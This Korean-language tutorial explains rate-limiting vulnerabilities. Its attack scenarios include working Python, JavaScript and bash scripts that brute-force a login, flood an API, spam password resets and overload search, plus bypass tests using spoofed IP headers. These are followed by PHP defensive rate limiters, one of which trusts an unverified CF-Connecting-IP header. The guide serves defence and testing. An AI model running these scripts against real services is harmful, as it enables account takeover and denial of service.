# Rate Limiting 취약점 분석

## 📋 취약점 개요

**Rate Limiting 취약점**은 웹 애플리케이션이 사용자의 요청 빈도를 제한하지 않거나 부적절하게 제한할 때 발생하는 보안 취약점입니다. 공격자가 대량의 요청을 통해 서비스를 마비시키거나 브루트 포스 공격을 수행할 수 있습니다.

### 🎯 공격 원리

1. **무제한 요청**: 요청 빈도 제한이 없거나 너무 관대함
2. **리소스 고갈**: 대량 요청으로 서버 리소스 소진
3. **브루트 포스**: 로그인, API 키 등에 대한 무차별 공격
4. **서비스 거부**: DoS/DDoS 공격으로 서비스 마비

### 🔍 주요 위험성

- **CVSS 점수**: 7.5 (High)
- **서비스 가용성 저하**: 정상 사용자의 서비스 이용 방해
- **브루트 포스 공격**: 패스워드, API 키 등 무차별 공격
- **리소스 낭비**: 서버 CPU, 메모리, 네트워크 대역폭 소모

## 🚨 공격 시나리오

### 시나리오 1: 로그인 브루트 포스

```python
# 공격자의 브루트 포스 스크립트
import requests
import itertools
import string

def brute_force_login():
    url = "http://target.com/login"
    passwords = ['password', '123456', 'admin', 'qwerty', 'password123']
    
    for password in passwords:
        data = {
            'username': 'admin',
            'password': password
        }
        
        response = requests.post(url, data=data)
        print(f"Trying password: {password}")
        
        if "Welcome" in response.text:
            print(f"Success! Password is: {password}")
            break
        elif "rate limit" in response.text.lower():
            print("Rate limited - but continuing...")
            continue
```

### 시나리오 2: API 남용

```javascript
// 무제한 API 호출
async function apiAbuse() {
    const apiUrl = 'http://target.com/api/expensive-operation';
    
    // 1초에 1000개 요청 전송
    for (let i = 0; i < 1000; i++) {
        fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer valid_token'
            },
            body: JSON.stringify({data: `request_${i}`})
        });
    }
}

// 10개의 동시 스레드로 공격
for (let j = 0; j < 10; j++) {
    apiAbuse();
}
```

### 시나리오 3: 패스워드 재설정 남용

```bash
#!/bin/bash
# 패스워드 재설정 요청 스팸

TARGET_EMAIL="victim@example.com"
RESET_URL="http://target.com/reset-password"

for i in {1..1000}; do
    curl -X POST \
         -H "Content-Type: application/json" \
         -d "{\"email\":\"$TARGET_EMAIL\"}" \
         "$RESET_URL" &
    
    if (( $i % 100 == 0 )); then
        echo "Sent $i requests"
        sleep 1
    fi
done

wait
echo "Password reset spam completed"
```

### 시나리오 4: 검색 기능 남용

```python
# 비용이 많이 드는 검색 요청 남용
import requests
import threading
import time

def expensive_search_attack():
    search_url = "http://target.com/search"
    
    # 복잡한 검색 쿼리 (시간과 리소스를 많이 소모)
    expensive_queries = [
        "a* OR b* OR c* OR d*",  # 와일드카드 남용
        "SELECT * FROM huge_table",  # SQL 인젝션 시도
        "%" + "%" * 100,  # 퍼센트 와일드카드 남용
        " ".join(["word"] * 1000)  # 매우 긴 검색어
    ]
    
    def send_search_request():
        for query in expensive_queries:
            try:
                response = requests.post(search_url, 
                                       data={'q': query}, 
                                       timeout=30)
                print(f"Search response time: {response.elapsed.total_seconds()}s")
            except requests.Timeout:
                print("Request timed out - server overloaded!")
    
    # 여러 스레드로 동시 공격
    threads = []
    for i in range(50):
        thread = threading.Thread(target=send_search_request)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

expensive_search_attack()
```

## 🛡️ 방어 방법

### 1. 기본 Rate Limiting 구현

```php
<?php
class BasicRateLimiter {
    private $redis;
    private $default_limit;
    private $window_size;
    
    public function __construct($redis_host = '127.0.0.1', $default_limit = 100, $window_size = 3600) {
        $this->redis = new Redis();
        $this->redis->connect($redis_host);
        $this->default_limit = $default_limit;
        $this->window_size = $window_size;
    }
    
    public function isAllowed($identifier, $limit = null, $window = null) {
        $limit = $limit ?: $this->default_limit;
        $window = $window ?: $this->window_size;
        
        $key = "rate_limit:" . $identifier;
        $current_time = time();
        $window_start = $current_time - $window;
        
        // 현재 윈도우에서 요청 수 확인
        $pipe = $this->redis->multi(Redis::PIPELINE);
        $pipe->zremrangebyscore($key, 0, $window_start); // 오래된 요청 제거
        $pipe->zcard($key); // 현재 요청 수 조회
        $pipe->zadd($key, $current_time, uniqid()); // 현재 요청 추가
        $pipe->expire($key, $window); // 키 만료 시간 설정
        
        $results = $pipe->exec();
        $current_requests = $results[1];
        
        return $current_requests < $limit;
    }
    
    public function getRemainingRequests($identifier, $limit = null) {
        $limit = $limit ?: $this->default_limit;
        $key = "rate_limit:" . $identifier;
        $current_requests = $this->redis->zcard($key);
        
        return max(0, $limit - $current_requests);
    }
    
    public function getResetTime($identifier) {
        $key = "rate_limit:" . $identifier;
        return $this->redis->ttl($key);
    }
}
?>
```

### 2. 고급 Rate Limiting (Token Bucket Algorithm)

```php
<?php
class TokenBucketRateLimiter {
    private $redis;
    
    public function __construct($redis_host = '127.0.0.1') {
        $this->redis = new Redis();
        $this->redis->connect($redis_host);
    }
    
    public function isAllowed($identifier, $capacity = 10, $refill_rate = 1, $tokens = 1) {
        $key = "token_bucket:" . $identifier;
        $now = microtime(true);
        
        // Lua 스크립트로 원자적 연산 보장
        $script = "
            local key = KEYS[1]
            local capacity = tonumber(ARGV[1])
            local refill_rate = tonumber(ARGV[2])
            local tokens_requested = tonumber(ARGV[3])
            local now = tonumber(ARGV[4])
            
            local bucket = redis.call('HMGET', key, 'tokens', 'last_refill')
            local tokens = tonumber(bucket[1]) or capacity
            local last_refill = tonumber(bucket[2]) or now
            
            -- Calculate tokens to add based on elapsed time
            local elapsed = math.max(0, now - last_refill)
            local tokens_to_add = math.floor(elapsed * refill_rate)
            tokens = math.min(capacity, tokens + tokens_to_add)
            
            -- Check if we have enough tokens
            if tokens >= tokens_requested then
                tokens = tokens - tokens_requested
                redis.call('HMSET', key, 'tokens', tokens, 'last_refill', now)
                redis.call('EXPIRE', key, 3600)
                return {1, tokens} -- Allow request
            else
                redis.call('HMSET', key, 'tokens', tokens, 'last_refill', now)
                redis.call('EXPIRE', key, 3600)
                return {0, tokens} -- Deny request
            end
        ";
        
        $result = $this->redis->eval($script, [$key, $capacity, $refill_rate, $tokens, $now], 1);
        
        return [
            'allowed' => (bool)$result[0],
            'remaining_tokens' => $result[1]
        ];
    }
}
?>
```

### 3. 다층 Rate Limiting 시스템

```php
<?php
class MultiTierRateLimiter {
    private $limiters = [];
    
    public function __construct() {
        $this->limiters = [
            'per_second' => new BasicRateLimiter('127.0.0.1', 10, 1),
            'per_minute' => new BasicRateLimiter('127.0.0.1', 60, 60),
            'per_hour' => new BasicRateLimiter('127.0.0.1', 1000, 3600),
            'per_day' => new BasicRateLimiter('127.0.0.1', 10000, 86400)
        ];
    }
    
    public function checkAllLimits($identifier) {
        $results = [];
        
        foreach ($this->limiters as $type => $limiter) {
            $key = $identifier . ':' . $type;
            
            switch ($type) {
                case 'per_second':
                    $allowed = $limiter->isAllowed($key, 10, 1);
                    break;
                case 'per_minute':
                    $allowed = $limiter->isAllowed($key, 60, 60);
                    break;
                case 'per_hour':
                    $allowed = $limiter->isAllowed($key, 1000, 3600);
                    break;
                case 'per_day':
                    $allowed = $limiter->isAllowed($key, 10000, 86400);
                    break;
            }
            
            $results[$type] = [
                'allowed' => $allowed,
                'remaining' => $limiter->getRemainingRequests($key),
                'reset_time' => $limiter->getResetTime($key)
            ];
            
            if (!$allowed) {
                return [
                    'allowed' => false,
                    'blocked_by' => $type,
                    'details' => $results
                ];
            }
        }
        
        return [
            'allowed' => true,
            'details' => $results
        ];
    }
}
?>
```

### 4. 적응형 Rate Limiting

```php
<?php
class AdaptiveRateLimiter {
    private $redis;
    private $base_limits;
    
    public function __construct($redis_host = '127.0.0.1') {
        $this->redis = new Redis();
        $this->redis->connect($redis_host);
        
        $this->base_limits = [
            'guest' => ['requests' => 100, 'window' => 3600],
            'user' => ['requests' => 1000, 'window' => 3600],
            'premium' => ['requests' => 5000, 'window' => 3600],
            'admin' => ['requests' => 10000, 'window' => 3600]
        ];
    }
    
    public function isAllowed($identifier, $user_type = 'guest', $endpoint = 'default') {
        // 1. 기본 제한 확인
        $base_limit = $this->base_limits[$user_type] ?? $this->base_limits['guest'];
        
        // 2. 엔드포인트별 조정
        $endpoint_multiplier = $this->getEndpointMultiplier($endpoint);
        $adjusted_limit = intval($base_limit['requests'] * $endpoint_multiplier);
        
        // 3. 시스템 부하 기반 동적 조정
        $system_load = $this->getSystemLoad();
        if ($system_load > 0.8) {
            $adjusted_limit = intval($adjusted_limit * 0.5); // 부하가 높으면 50% 감소
        } elseif ($system_load > 0.6) {
            $adjusted_limit = intval($adjusted_limit * 0.7); // 부하가 중간이면 30% 감소
        }
        
        // 4. 사용자 행동 패턴 기반 조정
        $behavior_score = $this->getUserBehaviorScore($identifier);
        if ($behavior_score < 0.5) {
            $adjusted_limit = intval($adjusted_limit * 0.3); // 의심스러운 행동이면 70% 감소
        }
        
        // 5. Rate Limiting 적용
        $key = "adaptive_rate:" . $identifier . ":" . $endpoint;
        return $this->applyRateLimit($key, $adjusted_limit, $base_limit['window']);
    }
    
    private function getEndpointMultiplier($endpoint) {
        $multipliers = [
            'login' => 0.1,        // 로그인은 매우 제한적
            'search' => 0.5,       // 검색은 제한적
            'api_expensive' => 0.2, // 비용이 많이 드는 API
            'upload' => 0.3,       // 파일 업로드
            'default' => 1.0       // 기본값
        ];
        
        return $multipliers[$endpoint] ?? $multipliers['default'];
    }
    
    private function getSystemLoad() {
        // 시스템 부하 모니터링 (CPU, 메모리, 네트워크 등)
        $load_key = "system:load";
        $cached_load = $this->redis->get($load_key);
        
        if ($cached_load === false) {
            // 실제 시스템 부하 측정
            $load = sys_getloadavg()[0] / 4.0; // 4코어 기준
            $this->redis->setex($load_key, 10, $load); // 10초 캐싱
            return $load;
        }
        
        return floatval($cached_load);
    }
    
    private function getUserBehaviorScore($identifier) {
        $score_key = "behavior_score:" . $identifier;
        $score = $this->redis->get($score_key);
        
        if ($score === false) {
            // 사용자 행동 분석
            $score = $this->analyzeUserBehavior($identifier);
            $this->redis->setex($score_key, 300, $score); // 5분 캐싱
        }
        
        return floatval($score);
    }
    
    private function analyzeUserBehavior($identifier) {
        // 사용자 행동 패턴 분석
        $patterns = [
            'request_intervals' => $this->getRequestIntervals($identifier),
            'error_rates' => $this->getErrorRates($identifier),
            'endpoint_diversity' => $this->getEndpointDiversity($identifier),
            'time_patterns' => $this->getTimePatterns($identifier)
        ];
        
        // 점수 계산 (0.0 ~ 1.0)
        $score = 1.0;
        
        // 매우 빠른 요청 간격 (봇 의심)
        if ($patterns['request_intervals']['avg'] < 0.1) {
            $score *= 0.3;
        }
        
        // 높은 에러율 (공격 시도 의심)
        if ($patterns['error_rates']['4xx'] > 0.5) {
            $score *= 0.4;
        }
        
        // 엔드포인트 다양성 부족 (특정 엔드포인트 집중 공격)
        if ($patterns['endpoint_diversity']['unique_ratio'] < 0.2) {
            $score *= 0.5;
        }
        
        return max(0.1, $score); // 최소 0.1 보장
    }
    
    private function applyRateLimit($key, $limit, $window) {
        $current_time = time();
        $window_start = $current_time - $window;
        
        $pipe = $this->redis->multi(Redis::PIPELINE);
        $pipe->zremrangebyscore($key, 0, $window_start);
        $pipe->zcard($key);
        $pipe->zadd($key, $current_time, uniqid());
        $pipe->expire($key, $window);
        
        $results = $pipe->exec();
        $current_requests = $results[1];
        
        return $current_requests < $limit;
    }
    
    // 헬퍼 메소드들 (실제 구현 필요)
    private function getRequestIntervals($identifier) { return ['avg' => 1.0]; }
    private function getErrorRates($identifier) { return ['4xx' => 0.1]; }
    private function getEndpointDiversity($identifier) { return ['unique_ratio' => 0.8]; }
    private function getTimePatterns($identifier) { return ['consistency' => 0.7]; }
}
?>
```

### 5. Rate Limiting 미들웨어

```php
<?php
class RateLimitingMiddleware {
    private $rateLimiter;
    private $config;
    
    public function __construct(AdaptiveRateLimiter $rateLimiter) {
        $this->rateLimiter = $rateLimiter;
        $this->config = [
            'enabled' => true,
            'whitelist_ips' => ['127.0.0.1', '::1'],
            'blacklist_ips' => [],
            'trusted_proxies' => []
        ];
    }
    
    public function handle($request, $next) {
        if (!$this->config['enabled']) {
            return $next($request);
        }
        
        $client_ip = $this->getClientIP($request);
        
        // IP 화이트리스트 확인
        if (in_array($client_ip, $this->config['whitelist_ips'])) {
            return $next($request);
        }
        
        // IP 블랙리스트 확인
        if (in_array($client_ip, $this->config['blacklist_ips'])) {
            return $this->createRateLimitResponse('IP blocked', 403);
        }
        
        // 식별자 생성
        $identifier = $this->generateIdentifier($request, $client_ip);
        
        // 사용자 타입 결정
        $user_type = $this->getUserType($request);
        
        // 엔드포인트 타입 결정
        $endpoint = $this->getEndpointType($request);
        
        // Rate Limiting 확인
        $allowed = $this->rateLimiter->isAllowed($identifier, $user_type, $endpoint);
        
        if (!$allowed) {
            // 로깅
            $this->logRateLimitViolation($identifier, $client_ip, $endpoint, $request);
            
            // 응답 생성
            return $this->createRateLimitResponse('Rate limit exceeded', 429);
        }
        
        // Rate Limiting 헤더 추가
        $response = $next($request);
        return $this->addRateLimitHeaders($response, $identifier);
    }
    
    private function getClientIP($request) {
        // X-Forwarded-For 헤더 확인 (프록시 환경)
        if (!empty($request->headers['X-Forwarded-For'])) {
            $ips = explode(',', $request->headers['X-Forwarded-For']);
            $client_ip = trim($ips[0]);
            
            // 신뢰할 수 있는 프록시인지 확인
            if ($this->isTrustedProxy($request->server['REMOTE_ADDR'])) {
                return $client_ip;
            }
        }
        
        // Cloudflare
        if (!empty($request->headers['CF-Connecting-IP'])) {
            return $request->headers['CF-Connecting-IP'];
        }
        
        // 직접 접근
        return $request->server['REMOTE_ADDR'];
    }
    
    private function generateIdentifier($request, $client_ip) {
        // 인증된 사용자
        if (!empty($request->user)) {
            return 'user:' . $request->user['id'];
        }
        
        // API 키 기반
        if (!empty($request->headers['X-API-Key'])) {
            return 'api:' . hash('sha256', $request->headers['X-API-Key']);
        }
        
        // IP 기반
        return 'ip:' . $client_ip;
    }
    
    private function getUserType($request) {
        if (empty($request->user)) {
            return 'guest';
        }
        
        if ($request->user['is_admin']) {
            return 'admin';
        }
        
        if ($request->user['is_premium']) {
            return 'premium';
        }
        
        return 'user';
    }
    
    private function getEndpointType($request) {
        $path = $request->path;
        
        if (strpos($path, '/login') !== false) return 'login';
        if (strpos($path, '/search') !== false) return 'search';
        if (strpos($path, '/upload') !== false) return 'upload';
        if (strpos($path, '/api/') !== false && strpos($path, '/expensive') !== false) return 'api_expensive';
        
        return 'default';
    }
    
    private function createRateLimitResponse($message, $status_code) {
        $response = [
            'error' => $message,
            'status' => $status_code,
            'timestamp' => time()
        ];
        
        http_response_code($status_code);
        header('Content-Type: application/json');
        header('Retry-After: 60'); // 1분 후 재시도
        
        return json_encode($response);
    }
    
    private function addRateLimitHeaders($response, $identifier) {
        // TODO: Rate limit 정보를 헤더에 추가
        // X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset
        return $response;
    }
    
    private function logRateLimitViolation($identifier, $ip, $endpoint, $request) {
        $log_data = [
            'timestamp' => date('Y-m-d H:i:s'),
            'identifier' => $identifier,
            'ip' => $ip,
            'endpoint' => $endpoint,
            'user_agent' => $request->headers['User-Agent'] ?? '',
            'method' => $request->method,
            'path' => $request->path
        ];
        
        error_log('RATE_LIMIT_VIOLATION: ' . json_encode($log_data));
    }
    
    private function isTrustedProxy($ip) {
        return in_array($ip, $this->config['trusted_proxies']);
    }
}
?>
```

## 🧪 테스트 방법

### 1. 기본 Rate Limiting 테스트

```python
import requests
import time

def test_basic_rate_limiting():
    url = "http://target.com/api/test"
    headers = {'Authorization': 'Bearer test_token'}
    
    success_count = 0
    rate_limited_count = 0
    
    # 100개 요청을 빠르게 전송
    for i in range(100):
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            success_count += 1
        elif response.status_code == 429:
            rate_limited_count += 1
            print(f"Rate limited at request {i+1}")
            
            # Retry-After 헤더 확인
            if 'Retry-After' in response.headers:
                wait_time = int(response.headers['Retry-After'])
                print(f"Should wait {wait_time} seconds")
    
    print(f"Success: {success_count}, Rate Limited: {rate_limited_count}")

test_basic_rate_limiting()
```

### 2. 우회 시도 테스트

```python
import requests
import random
import string

def test_rate_limit_bypass():
    url = "http://target.com/login"
    
    # 1. IP 스푸핑 시도
    fake_ips = ['192.168.1.100', '10.0.0.50', '172.16.0.10']
    
    for fake_ip in fake_ips:
        headers = {'X-Forwarded-For': fake_ip}
        data = {'username': 'admin', 'password': 'password'}
        response = requests.post(url, data=data, headers=headers)
        print(f"Fake IP {fake_ip}: {response.status_code}")
    
    # 2. User-Agent 변경 시도
    for i in range(10):
        user_agent = f"TestBot/{i}.0"
        headers = {'User-Agent': user_agent}
        data = {'username': 'admin', 'password': f'password{i}'}
        response = requests.post(url, data=data, headers=headers)
        print(f"User-Agent {user_agent}: {response.status_code}")
    
    # 3. 분산 요청 (딜레이 추가)
    for i in range(20):
        data = {'username': 'admin', 'password': f'test{i}'}
        response = requests.post(url, data=data)
        print(f"Delayed request {i}: {response.status_code}")
        time.sleep(random.uniform(0.5, 2.0))  # 0.5-2초 무작위 딜레이

test_rate_limit_bypass()
```

### 3. 부하 테스트

```bash
#!/bin/bash
# Apache Bench를 사용한 부하 테스트

# 1. 기본 부하 테스트
echo "Basic load test..."
ab -n 1000 -c 10 http://target.com/api/test

# 2. 인증이 필요한 엔드포인트 테스트
echo "Authenticated endpoint test..."
ab -n 500 -c 5 -H "Authorization: Bearer test_token" http://target.com/api/protected

# 3. POST 요청 테스트
echo "POST request test..."
ab -n 100 -c 5 -p post_data.txt -T application/json http://target.com/api/data

# 4. 다양한 동시 연결 수 테스트
for concurrency in 1 5 10 20 50; do
    echo "Testing with concurrency: $concurrency"
    ab -n 100 -c $concurrency http://target.com/ > "load_test_c${concurrency}.txt"
done
```

## 📚 참고 자료

### 공식 문서
- [OWASP Rate Limiting](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)
- [RFC 6585 - HTTP Status Code 429](https://tools.ietf.org/html/rfc6585)

### 보안 가이드
- [NIST Rate Limiting Guidelines](https://csrc.nist.gov/publications)
- [Cloudflare Rate Limiting](https://developers.cloudflare.com/firewall/cf-ratelimiting/)

### 도구 및 리소스
- [Redis for Rate Limiting](https://redis.io/commands#generic)
- [Nginx Rate Limiting](https://www.nginx.com/blog/rate-limiting-nginx/)

---

## 🎯 핵심 요약

1. **다층 제한**: 초/분/시/일 단위의 다중 Rate Limiting
2. **적응형 제한**: 시스템 부하와 사용자 행동에 따른 동적 조정
3. **정확한 식별**: IP, 사용자, API 키를 통한 정확한 클라이언트 식별
4. **모니터링**: Rate Limiting 위반 로깅 및 알림 시스템

**⚠️ 주의**: Rate Limiting은 정상 사용자에게 방해가 되지 않도록 적절한 임계값 설정이 중요합니다.